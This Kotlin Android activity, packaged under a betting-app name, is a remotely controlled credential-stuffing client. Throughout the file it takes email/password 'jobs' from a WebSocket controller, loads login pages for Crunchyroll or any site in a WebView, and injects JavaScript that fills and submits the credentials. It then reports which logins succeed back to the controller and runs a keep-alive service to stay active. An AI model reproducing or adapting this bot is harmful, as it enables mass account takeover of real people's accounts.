package com.hollywoodbets.app

import android.annotation.SuppressLint
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.WindowManager
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import com.google.gson.Gson
import com.google.gson.JsonObject

class MainActivity : Activity(), WebSocketManager.MessageListener {

    companion object {
        private const val TAG = "MainActivity"
    }

    private lateinit var webView: WebView
    private var webSocketManager: WebSocketManager? = null
    private val gson = Gson()
    private val handler = Handler(Looper.getMainLooper())

    // State tracking
    private var currentJob: JobData? = null
    private var isJobActive = false

    data class JobData(
        val url: String,
        val email: String,
        val target: String,
        val password: String
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Keep screen on
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)

        setupWebView()
        checkPermissionsAndStartService()

        webSocketManager = WebSocketManager(this)
        webSocketManager?.connect()
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = findViewById(R.id.activity_main_webview)
        val webSettings = webView.settings
        webSettings.javaScriptEnabled = true
        webSettings.domStorageEnabled = true
        webSettings.allowFileAccess = true
        webSettings.allowContentAccess = true
        webSettings.databaseEnabled = true
        webSettings.useWideViewPort = true
        webSettings.loadWithOverviewMode = true
        webSettings.builtInZoomControls = true
        webSettings.displayZoomControls = false

        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                return false // Stay in WebView
            }

            override fun onPageFinished(view: WebView, url: String?) {
                super.onPageFinished(view, url)
                Log.d(TAG, "Page finished: $url")

                if (isJobActive && currentJob != null && url != null) {
                    processJobOnPageLoad(url)
                }
            }

            override fun doUpdateVisitedHistory(view: WebView?, url: String?, isReload: Boolean) {
                super.doUpdateVisitedHistory(view, url, isReload)
                Log.d(TAG, "History updated: $url")
                 if (isJobActive && currentJob != null && url != null) {
                    checkSuccessCondition(url)
                }
            }
        }

        // Initial load
        webView.loadUrl("about:blank")
    }

    private fun checkPermissionsAndStartService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(arrayOf(android.Manifest.permission.POST_NOTIFICATIONS), 101)
            } else {
                startKeepAliveService()
            }
        } else {
            startKeepAliveService()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 101) {
            startKeepAliveService()
        }
    }

    private fun startKeepAliveService() {
        KeepAliveService.start(this)
    }

    // --- WebSocket Listener Implementation ---

    override fun onConnected() {
        runOnUiThread {
            // connection established
        }
    }

    override fun onDisconnected() {
        runOnUiThread {
            // disconnected
        }
    }

    override fun onMessageReceived(text: String) {
        runOnUiThread {
            try {
                if (text == "PING" || text == "PONG") return@runOnUiThread

                val job = gson.fromJson(text, JobData::class.java)
                if (job != null && !job.url.isNullOrEmpty()) {
                    startJob(job)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to parse message: $text", e)
            }
        }
    }

    // --- Job Logic ---

    private fun startJob(job: JobData) {
        Log.d(TAG, "Starting job for: ${job.target}")
        currentJob = job
        isJobActive = true
        webView.loadUrl(job.url)
    }

    private fun processJobOnPageLoad(url: String) {
        // Only inject if we are on the login page (or close to it)
        // Simplified check: if url matches job url roughly

        val job = currentJob ?: return

        when (job.target.lowercase()) {
            "crunchyroll" -> {
               injectCrunchyroll(job)
            }
            "generic" -> {
                injectGeneric(job)
            }
            else -> {
                 // Try generic
                 injectGeneric(job)
            }
        }

        // Schedule a check for failure if we don't succeed quickly
        handler.postDelayed({
            checkFailureCondition()
        }, 8000) // Wait 8 seconds after load/injection to check status
    }

    private fun injectCrunchyroll(job: JobData) {
        val js = """
            (function() {
                var emailInput = document.querySelector('input[name="email"]');
                var passInput = document.querySelector('input[name="password"]');
                var submitBtn = document.querySelector('button[type="submit"]');

                if (emailInput && passInput) {
                    emailInput.value = '${job.email}';
                    emailInput.dispatchEvent(new Event('input', { bubbles: true }));

                    passInput.value = '${job.password}';
                    passInput.dispatchEvent(new Event('input', { bubbles: true }));

                    setTimeout(function() {
                        if(submitBtn) submitBtn.click();
                    }, 500);
                }
            })();
        """.trimIndent()
        webView.evaluateJavascript(js, null)
    }

    private fun injectGeneric(job: JobData) {
         val js = """
            (function() {
                var emailInputs = document.querySelectorAll('input[type="email"], input[name*="user"], input[name*="email"]');
                var passInputs = document.querySelectorAll('input[type="password"]');
                var submitBtns = document.querySelectorAll('button[type="submit"], input[type="submit"]');

                if (emailInputs.length > 0) {
                    emailInputs[0].value = '${job.email}';
                    emailInputs[0].dispatchEvent(new Event('input', { bubbles: true }));
                }

                if (passInputs.length > 0) {
                    passInputs[0].value = '${job.password}';
                    passInputs[0].dispatchEvent(new Event('input', { bubbles: true }));
                }

                 setTimeout(function() {
                    if(submitBtns.length > 0) submitBtns[0].click();
                }, 1000);
            })();
        """.trimIndent()
        webView.evaluateJavascript(js, null)
    }

    private fun checkSuccessCondition(url: String) {
        if (!isJobActive) return

        // Simple heuristic: If URL is NOT the login URL and contains "dashboard", "home", or just changed significantly to not include "login"
        val job = currentJob ?: return

        // Define failure keywords
        val failureKeywords = listOf("login", "signin", "auth", "error")
        val isLoginUrl = failureKeywords.any { url.lowercase().contains(it) }

        // If we moved AWAY from login, assume success for now, OR if specific keywords exist
        // The requirements say: "Success Condition: If the URL changes to a "dashboard" or "home" URL (non-login)"

        val successKeywords = listOf("dashboard", "home", "account", "profile")
        val isSuccessUrl = successKeywords.any { url.lowercase().contains(it) }

        if (isSuccessUrl) {
            reportSuccess(job)
        }
    }

    private fun checkFailureCondition() {
        if (!isJobActive) return
        val url = webView.url ?: return
        val job = currentJob ?: return

        // If after delay we are still on login or error
         val failureKeywords = listOf("login", "signin", "auth", "error")
         val isFailure = failureKeywords.any { url.lowercase().contains(it) }

         // Or if we are still on the original URL
         if (isFailure || url == job.url) {
             reportFailure(job)
         }
    }

    private fun reportSuccess(job: JobData) {
        if (!isJobActive) return
        isJobActive = false
        Log.d(TAG, "Reporting Success")

        val response = JsonObject()
        response.addProperty("status", "SUCCESS")
        response.addProperty("email", job.email)

        webSocketManager?.send(gson.toJson(response))

        // Request next job
        handler.postDelayed({
             webSocketManager?.send("READY")
        }, 1000)
    }

    private fun reportFailure(job: JobData) {
        if (!isJobActive) return
        isJobActive = false
        Log.d(TAG, "Reporting Failure")

        val response = JsonObject()
        response.addProperty("status", "FAIL")
        response.addProperty("email", job.email)

        webSocketManager?.send(gson.toJson(response))

        // Request next job
        handler.postDelayed({
             webSocketManager?.send("READY")
        }, 1000)
    }

    override fun onDestroy() {
        super.onDestroy()
        webSocketManager?.stop()
    }
}
